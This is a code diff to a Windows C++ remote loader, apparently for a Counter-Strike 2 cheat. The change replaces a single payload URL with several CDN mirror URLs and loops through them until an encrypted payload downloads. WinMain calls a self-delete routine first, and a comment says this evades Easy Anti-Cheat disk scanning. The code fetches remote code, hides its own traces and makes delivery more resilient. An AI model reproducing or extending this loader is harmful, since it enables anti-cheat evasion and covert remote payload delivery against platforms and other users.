@@ -24,10 +24,13 @@
 // ============================================================
 
 // Payload 下载地址 — 部署时替换为你的服务器 URL
-static const wchar_t* PAYLOAD_URL = L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/main/payload.dat";
-
-// 备选 URL (主 URL 不可用时回退)
-static const wchar_t* PAYLOAD_URL_FALLBACK = L"";
+// 多 CDN 备选 (国内网络可能无法直连 raw.githubusercontent.com)
+static const wchar_t* PAYLOAD_URLS[] = {
+    L"https://cdn.jsdelivr.net/gh/heruixii/cs2-remote-loader@main/payload.dat",
+    L"https://cdn.statically.io/gh/heruixii/cs2-remote-loader/main/payload.dat",
+    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/main/payload.dat",
+};
+static const int PAYLOAD_URL_COUNT = sizeof(PAYLOAD_URLS) / sizeof(PAYLOAD_URLS[0]);
 
 // 下载超时 (毫秒)
 static const DWORD DOWNLOAD_TIMEOUT_MS = 30000;
@@ -353,12 +356,11 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     // --- 0. 启动后立即自删除 (规避 EAC 磁盘扫描) ---
     SelfDelete();
 
-    // --- 1. 下载 Payload ---
-    std::vector<uint8_t> encryptedData = DownloadPayload(PAYLOAD_URL);
-
-    // 主 URL 失败 → 尝试备选 URL
-    if (encryptedData.size() < 8 && PAYLOAD_URL_FALLBACK[0] != L'\0') {
-        encryptedData = DownloadPayload(PAYLOAD_URL_FALLBACK);
+    // --- 1. 下载 Payload (多 CDN 逐个尝试) ---
+    std::vector<uint8_t> encryptedData;
+    for (int i = 0; i < PAYLOAD_URL_COUNT; i++) {
+        encryptedData = DownloadPayload(PAYLOAD_URLS[i]);
+        if (encryptedData.size() >= 8) break;
     }
 
     if (encryptedData.size() < 8) {
